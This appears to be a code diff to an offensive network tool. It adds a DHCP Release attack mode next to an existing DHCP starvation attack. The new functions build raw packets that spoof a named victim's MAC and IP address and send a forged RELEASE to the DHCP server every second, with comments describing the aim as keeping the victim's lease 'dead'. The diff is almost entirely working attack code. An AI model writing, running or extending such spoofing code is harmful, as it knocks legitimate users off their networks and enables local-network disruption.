@@ -17,6 +17,7 @@ DHCP::~DHCP() {
 
 std::string DHCP::get_name() {
     if (current_mode == STARVATION) return "DHCP Starvation";
+    if (current_mode == RELEASE) return "DHCP Release";
     return "DHCP Attack";
 }
 
@@ -40,6 +41,15 @@ void DHCP::run(Session* session) {
         //std::cout << C_GREEN << "[*] Starting DHCP Starvation on " << session->interface << "..." << C_RESET << std::endl;
         // Launch multiple threads to fill the pool faster
         attack_threads.emplace_back(&DHCP::starvation_loop, this, session->interface);
+    }
+    else if (current_mode == RELEASE) {
+        // Validation: We need Target IP, Target MAC, and DHCP Server IP
+        if (session->target_ip.empty() || session->target_mac.empty() || session->dhcp_server_ip.empty()) {
+             std::cerr << C_RED << "[!] Error: DHCP Release requires Target IP, Target MAC, and DHCP Server IP." << C_RESET << std::endl;
+             return;
+        }
+        //std::cout << C_GREEN << "[*] Sending DHCP RELEASE packets to kick " << session->target_ip << "..." << C_RESET << std::endl;
+        attack_threads.emplace_back(&DHCP::release_loop, this, session);
     }
 }
 
@@ -206,4 +216,149 @@ void DHCP::send_dhcp_discover(int sock, int ifindex, const uint8_t* src_mac) {
     if (sendto(sock, buffer, total_len, 0, (struct sockaddr*)&device, sizeof(device)) < 0) {
         // Ignore errors
     }
+}
+
+// The release loop continuously sends DHCP RELEASE packets to the server
+void DHCP::release_loop(Session* session) {
+    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
+    if (sock < 0) return;
+
+    struct ifreq ifr;
+    memset(&ifr, 0, sizeof(ifr));
+    strncpy(ifr.ifr_name, session->interface.c_str(), IFNAMSIZ - 1);
+    if (ioctl(sock, SIOCGIFINDEX, &ifr) < 0) { close(sock); return; }
+    int ifindex = ifr.ifr_ifindex;
+
+    while (!stop_flag) {
+        send_dhcp_release(sock, ifindex, session);
+        // Send every 1 second. We don't need to flood; just keep the lease dead.
+        std::this_thread::sleep_for(std::chrono::seconds(1));
+    }
+    close(sock);
+}
+
+// Construct a DHCP RELEASE packet with the victim's IP/MAC and send it to the DHCP server, claiming "I am the victim and I am releasing my lease"
+void DHCP::send_dhcp_release(int sock, int ifindex, Session* session) {
+    uint8_t buffer[1024];
+    memset(buffer, 0, sizeof(buffer));
+
+    // Helper to convert MAC string to bytes
+    uint8_t target_mac[6];
+    sscanf(session->target_mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
+           &target_mac[0], &target_mac[1], &target_mac[2], &target_mac[3], &target_mac[4], &target_mac[5]);
+           
+    uint8_t server_mac[6];
+    // If Gateway is the DHCP server (usually true), use Gateway MAC. 
+    // Otherwise we'd need to ARP resolve the DHCP IP, but let's assume Gateway for now.
+    if (!session->gateway_mac.empty()) {
+        sscanf(session->gateway_mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
+           &server_mac[0], &server_mac[1], &server_mac[2], &server_mac[3], &server_mac[4], &server_mac[5]);
+    } else {
+        memset(server_mac, 0xff, 6); // Fallback to broadcast if unknown (less reliable)
+    }
+
+    // --- 1. ETHERNET HEADER ---
+    struct ethhdr* eth = (struct ethhdr*)buffer;
+    memcpy(eth->h_dest, server_mac, 6);   // To Router
+    memcpy(eth->h_source, target_mac, 6); // SPOOFED: From Victim
+    eth->h_proto = htons(ETH_P_IP);
+
+    // --- 2. IP HEADER ---
+    struct ip* ip = (struct ip*)(buffer + sizeof(struct ethhdr));
+    ip->ip_hl = 5;
+    ip->ip_v = 4;
+    ip->ip_tos = 0;
+    ip->ip_id = htons(rand() % 65535);
+    ip->ip_off = 0;
+    ip->ip_ttl = 64;
+    ip->ip_p = IPPROTO_UDP;
+    ip->ip_src.s_addr = inet_addr(session->target_ip.c_str()); // SPOOFED: From Victim
+    ip->ip_dst.s_addr = inet_addr(session->dhcp_server_ip.c_str()); // To Server
+
+    // --- 3. UDP HEADER ---
+    struct udphdr* udp = (struct udphdr*)(buffer + sizeof(struct ethhdr) + sizeof(struct ip));
+    udp->source = htons(68);
+    udp->dest = htons(67);
+    udp->check = 0;
+
+    // --- 4. DHCP HEADER ---
+    struct dhcp_header* dhcp = (struct dhcp_header*)(buffer + sizeof(struct ethhdr) + sizeof(struct ip) + sizeof(struct udphdr));
+    dhcp->op = 1;     // BOOTREQUEST
+    dhcp->htype = 1;  
+    dhcp->hlen = 6;   
+    dhcp->hops = 0;
+    dhcp->xid = htonl(rand()); 
+    dhcp->secs = 0;
+    dhcp->flags = 0; // Unicast (no broadcast flag)
+    dhcp->ciaddr = inet_addr(session->target_ip.c_str()); // CRITICAL: "This is MY IP"
+    dhcp->yiaddr = 0;
+    dhcp->siaddr = 0;
+    dhcp->giaddr = 0;
+    dhcp->cookie = htonl(0x63825363); 
+    memcpy(dhcp->chaddr, target_mac, 6); // CRITICAL: Victim MAC
+
+    // --- 5. OPTIONS ---
+    uint8_t* options = (uint8_t*)(dhcp + 1);
+    int offset = 0;
+
+    // Option 53: Message Type = RELEASE (7)
+    options[offset++] = 53; options[offset++] = 1; options[offset++] = 7;
+
+    // Option 54: Server Identifier (CRITICAL for Release)
+    // You MUST tell the server "I am talking to YOU specifically"
+    options[offset++] = 54; 
+    options[offset++] = 4;
+    uint32_t server_ip_n = inet_addr(session->dhcp_server_ip.c_str());
+    memcpy(options + offset, &server_ip_n, 4);
+    offset += 4;
+
+    // --- NEW FIX: Option 61 (Client Identifier) ---
+    options[offset++] = 61; // Option Code
+    options[offset++] = 7;  // Length
+    options[offset++] = 1;  // Type: Ethernet
+    memcpy(options + offset, target_mac, 6); // Victim MAC
+    offset += 6;
+    // ----------------------------------------------
+
+    // Option 255: End
+    options[offset++] = 255;
+
+    // Padding (Just in case)
+    while (sizeof(struct dhcp_header) + offset < 300) { options[offset++] = 0; }
+
+    // --- 6. LENGTHS ---
+    int dhcp_size = sizeof(struct dhcp_header) + offset;
+    int udp_len = sizeof(struct udphdr) + dhcp_size;
+    int ip_len = sizeof(struct ip) + udp_len;
+    int total_len = sizeof(struct ethhdr) + ip_len;
+
+    udp->len = htons(udp_len);
+    ip->ip_len = htons(ip_len);
+    
+    // IP Checksum (Reuse your helper)
+    ip->ip_sum = 0;
+    ip->ip_sum = calculate_checksum((unsigned short*)ip, sizeof(struct ip));
+
+    // --- 7. SEND ---
+    struct sockaddr_ll device;
+    memset(&device, 0, sizeof(device));
+    device.sll_family = AF_PACKET;
+    device.sll_ifindex = ifindex;
+    device.sll_halen = ETH_ALEN;
+    memcpy(device.sll_addr, server_mac, 6);
+
+    sendto(sock, buffer, total_len, 0, (struct sockaddr*)&device, sizeof(device));
+}
+
+void DHCP::start_starvation_background(Session* session) {
+    if (session->interface.empty()) {
+        std::cerr << C_YELLOW << "DHCP Attack requires an Interface." << C_RESET << std::endl;
+        return;
+    }
+    stop_flag = false;
+    attack_threads.emplace_back(&DHCP::starvation_loop, this, session->interface);
+}
+
+void DHCP::stop_starvation() {
+    stop();
 }
